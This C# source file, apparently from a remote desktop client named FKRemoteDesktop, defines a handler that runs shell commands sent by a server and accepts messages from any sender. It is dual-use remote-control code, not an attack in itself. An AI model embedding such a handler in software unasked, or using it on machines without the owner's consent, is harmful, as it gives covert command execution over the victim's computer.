using FKRemoteDesktop.Debugger;
using FKRemoteDesktop.Enums;
using FKRemoteDesktop.Framework;
using FKRemoteDesktop.Message.SubMessages;
using FKRemoteDesktop.Network;
using FKRemoteDesktop.Shell;
using System;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Message.SubMessageHandler
{
    public class RemoteShellHandler : IMessageProcessor, IDisposable
    {
        private ShellSession _shellSession;                           // Shell实例
        private readonly FKClient _client;

        public RemoteShellHandler(FKClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
        }

        private void OnClientStateChange(Client s, bool connected)
        {
            if (!connected)
            {
                _shellSession?.Dispose();
            }
        }

        public bool CanExecute(IMessage message) => message is DoShellExecute;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoShellExecute shellExec:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoShellExecute");
                    Execute(sender, shellExec);
                    break;
            }
        }

        private void Execute(ISender client, DoShellExecute message)
        {
            string input = message.Command;

            if (_shellSession == null && input == "exit")
                return;
            if (_shellSession == null)
                _shellSession = new ShellSession(_client);
            if (input == "exit")
                _shellSession.Dispose();
            else
                _shellSession.ExecuteCommand(input);
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _shellSession?.Dispose();
            }
        }
    }
}